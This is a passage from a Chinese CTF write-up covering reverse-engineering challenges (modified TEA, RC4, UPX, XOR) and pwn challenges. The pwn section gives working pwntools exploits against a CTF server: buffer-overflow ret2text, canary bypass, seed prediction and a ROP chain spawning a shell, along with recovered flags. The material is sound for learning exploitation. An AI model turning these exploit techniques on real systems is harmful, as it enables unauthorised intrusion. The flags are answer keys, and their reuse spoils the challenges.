class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;PYC_i5_v4ry_e4sy~&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="Week2-Do-you-like-to-drink-Tea"><a href="#Week2-Do-you-like-to-drink-Tea" class="headerlink" title="[Week2] Do you like to drink Tea?"></a>[Week2] Do you like to drink Tea?</h2><p>简单的魔改tea</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251013142436381.png" alt="image-20251013142436381"></p>
<p>exp</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], i;</span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">-1640531527</span>,sum=delta*<span class="number">32</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123; </span><br><span class="line">    	sum -= delta;</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">6</span>) + k2) ^ (v0 + sum + <span class="number">20</span>) ^ ((v0&gt;&gt;<span class="number">9</span>) + k3);</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">6</span>) + k0) ^ (v1 + sum + <span class="number">11</span>) ^ ((v1&gt;&gt;<span class="number">9</span>) + k1);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">uint32_t</span> k[<span class="number">4</span>]=&#123;<span class="number">305419896</span>,<span class="number">-1412567295</span>,<span class="number">289739801</span>,<span class="number">421101825</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> v4[<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	v4[<span class="number">0</span>] = <span class="number">-262322456</span>;</span><br><span class="line">	v4[<span class="number">1</span>] = <span class="number">1199964143</span>;</span><br><span class="line">	v4[<span class="number">2</span>] = <span class="number">-201212030</span>;</span><br><span class="line">	v4[<span class="number">3</span>] = <span class="number">-436419062</span>;</span><br><span class="line">	v4[<span class="number">4</span>] = <span class="number">-1099955107</span>;</span><br><span class="line">	v4[<span class="number">5</span>] = <span class="number">544769843</span>;</span><br><span class="line">	v4[<span class="number">6</span>] = <span class="number">-1824808087</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">5</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">		<span class="built_in">decrypt</span>(&amp;v4[i], k);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%s\n&quot;</span>,(<span class="type">char</span>*)v4); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Week2-UPX"><a href="#Week2-UPX" class="headerlink" title="[Week2] UPX"></a>[Week2] UPX</h2><p>找一个正常UPX压缩的程序，通过对比，将这几个地方改一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251013143232064.png" alt="image-20251013143232064"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251013143354489.png" alt="image-20251013143354489"></p>
<p>接着就能正常UPX解压了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251013143447832.png" alt="image-20251013143447832"></p>
<p>简单的移位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="string">&#x27;fkyd&#123;YNek_SD_AB@ars_OKT&#125;&#x27;</span></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(enc[i]) &gt; <span class="number">64</span> <span class="keyword">and</span> <span class="built_in">ord</span>(enc[i]) &lt;= <span class="number">90</span>:</span><br><span class="line">        flag += [(<span class="built_in">ord</span>(enc[i]) - <span class="number">65</span> - i + <span class="number">26</span>) % <span class="number">26</span> + <span class="number">65</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(enc[i]) &gt; <span class="number">96</span> <span class="keyword">and</span> <span class="built_in">ord</span>(enc[i]) &lt;= <span class="number">122</span>:</span><br><span class="line">        flag += [(<span class="built_in">ord</span>(enc[i]) - <span class="number">97</span> + i + <span class="number">26</span>) % <span class="number">26</span> + <span class="number">97</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += [<span class="built_in">ord</span>(enc[i])]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"><span class="comment"># flag&#123;THls_IS_NN@qik_UPX&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week2-base"><a href="#Week2-base" class="headerlink" title="[Week2] base"></a>[Week2] base</h2><p>跑样例得到码表</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251013144557428.png" alt="image-20251013144557428"></p>
<p>base58解码得到base64的码表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251013144643631.png" alt="image-20251013144643631"></p>
<p>接着找到类似base64的字符串，解码得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251013144719067.png" alt="image-20251013144719067"></p>
<h2 id="Week2-rc4"><a href="#Week2-rc4" class="headerlink" title="[Week2] rc4"></a>[Week2] rc4</h2><p>魔改rc4，比正常的rc4多了一步按位异或</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251014154234088.png" alt="image-20251014154234088"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">data, key1</span>):</span><br><span class="line">    enc = ARC4.new(key)</span><br><span class="line">    tmp = enc.decrypt(data)</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)):</span><br><span class="line">        res += [tmp[i]^i]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(res)</span><br><span class="line"></span><br><span class="line">enc = [<span class="string">&#x27;D6DB345DC17A5FF7&#x27;</span>,<span class="string">&#x27;68DAE1DE2D75D82F&#x27;</span>,<span class="string">&#x27;F907EACE4A9B57E0&#x27;</span>,<span class="string">&#x27;f95e795e&#x27;</span>]</span><br><span class="line"></span><br><span class="line">encrypt_data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    encrypt_data += <span class="built_in">bytes</span>.fromhex(i)[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;3443526868686F&#x27;</span></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;解密后:&#x27;</span>,rc4_decrypt(encrypt_data, key))</span><br><span class="line"><span class="comment"># 解密后: b&#x27;flag&#123;S0NNE_Rc4_l$_c13@nged&#125;\xbc&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week2-螺旋密码机"><a href="#Week2-螺旋密码机" class="headerlink" title="[Week2] 螺旋密码机"></a>[Week2] 螺旋密码机</h2><p>.apk改成.zip后缀，解压后反编译<code>libnative-lib.so</code>，可以看到<code>decryptFlag</code>函数</p>
<p>这个函数就一个异或，使用flag头反推出异或的key是<code>136</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">decryptFlag</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> __int8 *a1, <span class="type">char</span> *a2, <span class="type">char</span> a3, <span class="type">char</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">bool</span> v5; <span class="comment">// [rsp+Fh] [rbp-21h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// [rsp+15h] [rbp-1Bh]</span></span><br><span class="line"></span><br><span class="line">  v7 = a4 ^ a3 ^ <span class="number">0x42</span>;</span><br><span class="line">  __android_log_print(<span class="number">4LL</span>, <span class="string">&quot;FibValidator&quot;</span>, asc_17287, <span class="number">66LL</span>, (<span class="type">unsigned</span> __int8)(a4 ^ a3), v7);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i &lt; <span class="number">31</span> )</span><br><span class="line">      v5 = a1[i] != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a2[i] = v7 ^ a1[i];</span><br><span class="line">  &#125;</span><br><span class="line">  a2[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __android_log_print(<span class="number">4LL</span>, <span class="string">&quot;FibValidator&quot;</span>, asc_16CA2, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0xEE</span>, <span class="number">0xE4</span>, <span class="number">0xE9</span>, <span class="number">0xEF</span>, <span class="number">0xF3</span>, <span class="number">0xCC</span>, <span class="number">0xF1</span>, <span class="number">0xE6</span>, <span class="number">0xBC</span>, <span class="number">0xE5</span>, </span><br><span class="line">  <span class="number">0xB9</span>, <span class="number">0xEB</span>, <span class="number">0xD7</span>, <span class="number">0xC4</span>, <span class="number">0xB8</span>, <span class="number">0xBC</span>, <span class="number">0xEC</span>, <span class="number">0xBB</span>, <span class="number">0xFA</span>, <span class="number">0xD7</span>, </span><br><span class="line">  <span class="number">0xC5</span>, <span class="number">0xBC</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xBB</span>, <span class="number">0xFA</span>, <span class="number">0xF5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc =[<span class="number">0xEE</span>, <span class="number">0xE4</span>, <span class="number">0xE9</span>, <span class="number">0xEF</span>, <span class="number">0xF3</span>, <span class="number">0xCC</span>, <span class="number">0xF1</span>, <span class="number">0xE6</span>, <span class="number">0xBC</span>, <span class="number">0xE5</span>, </span><br><span class="line">  <span class="number">0xB9</span>, <span class="number">0xEB</span>, <span class="number">0xD7</span>, <span class="number">0xC4</span>, <span class="number">0xB8</span>, <span class="number">0xBC</span>, <span class="number">0xEC</span>, <span class="number">0xBB</span>, <span class="number">0xFA</span>, <span class="number">0xD7</span>, </span><br><span class="line">  <span class="number">0xC5</span>, <span class="number">0xBC</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xBB</span>, <span class="number">0xFA</span>, <span class="number">0xF5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    flag += [i^<span class="number">136</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;Dyn4m1c_L04d3r_M4st3r&#125;\x88\x88\x88\x88\x88&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week2-flowers"><a href="#Week2-flowers" class="headerlink" title="[Week2] flowers"></a>[Week2] flowers</h2><p>手动去花，然后按p看到main函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251014171306203.png" alt="image-20251014171306203"></p>
<p>接着给enc函数去花</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251014173452047.png" alt="image-20251014173452047"></p>
<p>显然是一个tea</p>
<p>exp</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], i;</span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">1131796</span>,sum=delta*<span class="number">32</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v4[<span class="number">6</span>];</span><br><span class="line">	<span class="type">uint32_t</span> k[<span class="number">4</span>]=&#123;<span class="number">0x1234567</span>,<span class="number">0x89ABCDEF</span>,<span class="number">0xFEDCBA98</span>,<span class="number">0x76543210</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    v4[<span class="number">0</span>] = <span class="number">0x47A215A5</span>;</span><br><span class="line">    v4[<span class="number">1</span>] = <span class="number">0x0DB8F1C31</span>;</span><br><span class="line">    v4[<span class="number">2</span>] = <span class="number">0x916ABF13</span>;</span><br><span class="line">    v4[<span class="number">3</span>] = <span class="number">0x0DE25122F</span>;</span><br><span class="line">    v4[<span class="number">4</span>] = <span class="number">0x66F52649</span>;</span><br><span class="line">    v4[<span class="number">5</span>] = <span class="number">0x4E9B0E55</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> v5[<span class="number">2</span>];</span><br><span class="line">    v5[<span class="number">0</span>] = <span class="number">0x916ABF13</span>;</span><br><span class="line">    v5[<span class="number">1</span>] = <span class="number">0x0DE25122F</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">decrypt</span>(&amp;v4[i], k);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%s\n&quot;</span>,(<span class="type">char</span>*)v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出的结果：flag&#123;aCupOf_FlowerTea&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Week1-No-vuln"><a href="#Week1-No-vuln" class="headerlink" title="[Week1] No vuln"></a>[Week1] No vuln</h2><p>条件竞争</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh1 = process(&#x27;./112538_NoVuln&#x27;)</span></span><br><span class="line"><span class="comment"># sh2 = process(&#x27;./112538_NoVuln&#x27;)</span></span><br><span class="line">sh1 = remote(<span class="string">&#x27;challenge.ilovectf.cn&#x27;</span>, <span class="number">30498</span>)</span><br><span class="line">sh2 = remote(<span class="string">&#x27;challenge.ilovectf.cn&#x27;</span>, <span class="number">30498</span>)</span><br><span class="line"></span><br><span class="line">sh1.sendline(<span class="string">&#x27;W&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">sh2.sendline(<span class="string">&#x27;R&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">sh1.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh2.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Week1-count"><a href="#Week1-count" class="headerlink" title="[Week1] count"></a>[Week1] count</h2><p>写脚本做计算题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># challenge.ilovectf.cn:30502</span></span><br><span class="line">sh = remote(<span class="string">&#x27;challenge.ilovectf.cn&#x27;</span>, <span class="number">30502</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="number">2025</span>*<span class="number">2025</span>))</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;ready?\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    data = sh.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    data = data.replace(<span class="string">b&#x27;?&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    data = data.replace(<span class="string">b&#x27;=&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    res = <span class="built_in">eval</span>(data)</span><br><span class="line">    sh.sendline(<span class="built_in">hex</span>(res))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Week1-ncncnc"><a href="#Week1-ncncnc" class="headerlink" title="[Week1] ncncnc"></a>[Week1] ncncnc</h2><p>输入<code>$0</code>获得新的shell，绕过过滤</p>
<h2 id="Week1-勇者救公主"><a href="#Week1-勇者救公主" class="headerlink" title="[Week1] 勇者救公主"></a>[Week1] 勇者救公主</h2><p>gdb命令的使用，很好玩</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i r</span><br><span class="line">x/1x 0x402100</span><br><span class="line">b 0x404000</span><br><span class="line">step</span><br><span class="line">i r </span><br><span class="line">step</span><br><span class="line">step</span><br><span class="line">step</span><br><span class="line">x/4x $rsp</span><br><span class="line">disas 0x406000</span><br><span class="line">set $rbx=0x42</span><br><span class="line">x/4x 0x409100</span><br><span class="line">x/1x 0x0000000000409200</span><br><span class="line">p system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">answer 0x7fffffffe000</span><br><span class="line">answer 0x00000000deadbeef</span><br><span class="line">answer 0x1337</span><br><span class="line">answer 0x40400c</span><br><span class="line">answer 0x00000000abcdef00</span><br><span class="line">answer 55</span><br><span class="line">answer 0x42</span><br><span class="line">answer 5</span><br><span class="line">answer 0x0000000088888888</span><br><span class="line">answer 0x7ffff7e50000</span><br></pre></td></tr></table></figure>

<h2 id="Week1-危险的-gets"><a href="#Week1-危险的-gets" class="headerlink" title="[Week1] 危险的 gets"></a>[Week1] 危险的 gets</h2><p>ret2text</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># challenge.ilovectf.cn:30548</span></span><br><span class="line">sh = remote(<span class="string">&#x27;challenge.ilovectf.cn&#x27;</span>, <span class="number">30548</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">64</span>+<span class="number">8</span>) + p64(<span class="number">0x4011BE</span>)</span><br><span class="line">sh.sendline(p)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Week1-幸运星"><a href="#Week1-幸运星" class="headerlink" title="[Week1] 幸运星"></a>[Week1] 幸运星</h2><p>伪随机数，种子为当前时间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># sh = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># challenge.ilovectf.cn:30564</span></span><br><span class="line">sh = remote(<span class="string">&#x27;challenge.ilovectf.cn&#x27;</span>, <span class="number">30564</span>)</span><br><span class="line"></span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    tmp = libc.rand()% <span class="number">53</span> + <span class="number">7</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(tmp))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Week2-bird"><a href="#Week2-bird" class="headerlink" title="[Week2] bird"></a>[Week2] bird</h2><p>canary+ret2text，canary是自定义的</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b* 0x4014A9&#x27;)</span></span><br><span class="line"><span class="comment"># challenge.ilovectf.cn:30153</span></span><br><span class="line">sh = remote(<span class="string">&#x27;challenge.ilovectf.cn&#x27;</span>, <span class="number">30153</span>)</span><br><span class="line"></span><br><span class="line">ca = <span class="string">b&#x27;aaaaaaa\n&#x27;</span></span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&#x27;Input:&#x27;</span>,ca)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x40121C</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + ca +p64(<span class="number">0</span>)+ p64(backdoor)</span><br><span class="line">sh.sendafter(<span class="string">&#x27;Overflow input&gt;&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Week2-stackoverflow"><a href="#Week2-stackoverflow" class="headerlink" title="[Week2] stackoverflow"></a>[Week2] stackoverflow</h2><p>当<code>power==1</code>时，存在更大的栈溢出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251012231659553.png" alt="image-20251012231659553"></p>
<p><code>system</code>和<code>/bin/sh</code>分开，使用ROP链调用即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./pwwn&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b* 0x40156B&#x27;)</span></span><br><span class="line"><span class="comment"># challenge.ilovectf.cn:30182</span></span><br><span class="line">sh = remote(<span class="string">&#x27;challenge.ilovectf.cn&#x27;</span>, <span class="number">30182</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x0000000000401332</span></span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line">system = <span class="number">0x40132D</span></span><br><span class="line">bin_sh = <span class="number">0x4035C8</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;No&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = b&#x27;a&#x27;*(0x130+7) + p64(ret_addr) +p64(pop_rdi_ret_addr) + p64(bin_sh) + p64(system)</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>+<span class="number">3</span>) +p64(pop_rdi_ret_addr) + p64(bin_sh) + p64(system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

